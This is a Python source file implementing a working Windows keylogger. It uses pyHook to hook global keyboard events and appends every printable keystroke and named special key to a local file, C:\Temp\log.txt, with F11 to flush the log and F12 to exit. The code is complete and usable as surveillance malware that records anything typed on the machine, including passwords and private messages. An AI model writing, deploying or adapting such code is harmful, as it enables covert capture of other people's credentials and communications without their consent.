import pyHook
import time
import pythoncom
import sys

class KeyLogger:
    ''' Captures all keystrokes, and logs them to a text file
    '''
    def __init__(self, hookKeyboard=1, hookMouse=0, exitKey="F12", flushKey="F11", logFile="C:\Temp\log.txt", addLineFeed=0, parseBackspace=0, parseEscape=0, debug=0):
        
        self.exitKey = exitKey                      #key we press to quit keylogger
        self.flushKey = flushKey                    #key we press to make keylogger flush the file buffer (so we can check the log, for example)
        self.parseBackspace = parseBackspace
        self.parseEscape = parseEscape
        self.addLineFeed = addLineFeed
        self.debug = debug
        
        self.hm = pyHook.HookManager()
    
        self.hm.KeyDown = self.OnKeyboardEvent
    
        if hookKeyboard == 1:
            self.hm.HookKeyboard()
        if hookMouse == 1:
            self.hm.HookMouse()
        
        if self.debug == 0:
            self.log = open(logFile, 'a')            
        
        #ascii subset is created as a filter to exclude funky non-printable chars from the log
        self.asciiSubset = [8,9,10,13,27]           #backspace, tab, line feed, carriage return, escape
        self.asciiSubset.extend(range(32,128))      #all normal printable chars
        
        if self.parseBackspace == 1:
            self.asciiSubset.remove(8)              #remove backspace from allowed chars if needed
        if self.parseEscape == 1:
            self.asciiSubset.remove(27)             #remove escape from allowed chars if needed
        
        pythoncom.PumpMessages()
            

    def OnKeyboardEvent(self, event):
        '''This function actually writes the stuff to the log, subject to parsing.
        '''
        '''
        self.log.write('MessageName: ' + str(event.MessageName))
        self.log.write('Message: ' + str(event.Message))
        self.log.write('Time: ' + str(event.Time))
        self.log.write('Window: ' + str(event.Window))
        self.log.write('WindowName: ' + str(event.WindowName))
        self.log.write('Ascii: ' + str(event.Ascii) + ' ' + chr(event.Ascii))
        self.log.write('Key: ' + str(event.Key))
        self.log.write('KeyID: ' + str(event.KeyID))
        self.log.write('ScanCode: ' + str(event.ScanCode))
        self.log.write('Extended: ' + str(event.Extended))
        self.log.write('Injected: ' + str(event.Injected))
        self.log.write('Alt: ' + str(event.Alt))
        self.log.write('Transition: ' + str(event.Transition))
        self.log.write('---\n')
        '''
        if event.Ascii in self.asciiSubset:
            self.PrintStuff(chr(event.Ascii))
        if event.Ascii == 13 and self.addLineFeed == 1:
            self.PrintStuff(chr(10))                 #add line feed after CR,if option is set
            
        #we translate all the special keys, such as arrows, backspace, into text strings for logging
        #exclude shift keys, because they are already represented (as capital letters/symbols)
        if event.Ascii == 0 and not (str(event.Key).endswith('shift')):
            self.PrintStuff('[KeyName:' + event.Key + ']')
        
        #translate backspace into text string, if option is set.
        if event.Ascii == 8 and self.parseBackspace == 1:
            self.PrintStuff('[KeyName:' + event.Key + ']')
        
        #translate escape into text string, if option is set.
        if event.Ascii == 27 and self.parseEscape == 1:
            self.PrintStuff('[KeyName:' + event.Key + ']')
        
        if event.Key == self.flushKey:
            self.log.flush()
        
        if event.Key == self.exitKey:
            sys.exit()
            
        return True
    def PrintStuff(self, stuff):
        if self.debug == 0:
            self.log.write(stuff)
        else:
            sys.stdout.write(stuff)

if __name__ == '__main__':
    kl = KeyLogger()
    
    #if you want to change keylogger behavior from defaults, comment out the above line, and uncomment below, changing
    #parameters as needed.
    #kl = KeyLogger(hookKeyboard=1, hookMouse=0, exitKey="F12", flushKey="F11", logFile="C:\Temp\log.txt", addLineFeed=1, parseBackspace=1, parseEscape=1, debug=0)
    